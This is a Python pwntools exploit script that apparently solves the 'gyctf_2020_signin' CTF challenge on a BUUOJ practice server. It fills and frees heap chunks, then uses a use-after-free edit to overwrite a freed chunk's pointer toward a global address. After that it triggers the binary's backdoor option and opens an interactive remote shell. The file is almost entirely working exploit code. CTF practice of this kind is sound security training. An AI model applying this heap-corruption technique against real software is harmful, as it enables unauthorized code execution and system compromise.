from pwn import *


ld_path = "/home/fanxinli/libc-so/libc-27/ld-2.27.so"
libc_path = "/home/fanxinli/libc-so/libc-2.27-64.so"
# p = process([ld_path, "./gyctf_2020_signin"], env={"LD_PRELOAD":libc_path})
# p = process([ld_path, ""])
# p = process("", env={"LD_PRELOAD":libc_path})
# p = process("./gyctf_2020_signin")
p = remote("node4.buuoj.cn", 28902)

# context.log_level = "debug"

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()


def add(index):
    sa("your choice?", "1")
    sa("idx?\n", str(index))

def edit(index, con):
    sa("your choice?", "2")
    sa("idx?\n", str(index).ljust(0xf, "\x00"))
    s(con)

def free(index):
    sa("your choice?", "3")
    sa("idx?\n", str(index))

def backdoor():
    sa("your choice?", "6")


# uaf + calloc
# calloc don't use tcache bin

for i in range(8):
    add(i)
for i in range(8):
    free(i)

ptr = 0x04040C0 
edit(7, p64(ptr-0x10))
add(8)
backdoor()

shell()


